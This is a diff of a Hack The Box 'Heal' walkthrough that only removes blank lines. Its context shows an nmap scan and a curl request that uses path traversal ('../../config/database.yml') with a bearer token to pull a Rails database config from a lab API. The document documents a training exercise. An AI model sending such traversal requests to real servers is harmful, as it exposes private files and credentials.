@@ -33,7 +33,6 @@ Heal is a medium-difficult Linux machine that features a website vulnerable to a
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Thu Dec 19 18:53:34 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.10.11.46
 Nmap scan report for 10.10.11.46
 Host is up, received user-set (0.20s latency).
@@ -55,7 +54,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Thu Dec 19 18:53:49 2024 -- 1 IP address (1 host up) scanned in 15.11 seconds
 ```
 
@@ -365,17 +363,11 @@ http://api.heal.htb [200] [Ruby on Rails 7.1.4] [nginx/1.18.0 (Ubuntu)] [b4f5742
 {"errors":"File not found"}                                                                                                                                                                                      
 ┌──(bravosec㉿fsociety)-[~/htb/Heal]
 └─$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=../../config/database.yml'
-
 # SQLite. Versions 3.8.0 and up are supported.
-
 #   gem install sqlite3
-
 #
-
 #   Ensure the SQLite 3 gem is defined in your Gemfile
-
 #   gem "sqlite3"
-
 #
 default: &default
   adapter: sqlite3
@@ -386,11 +378,8 @@ development:
   <<: *default
   database: storage/development.sqlite3
 
-
 # Warning: The database defined as "test" will be erased and
-
 # re-generated from your development database when you run "rake".
-
 # Do not set this db to the same as development or production.
 test:
   <<: *default
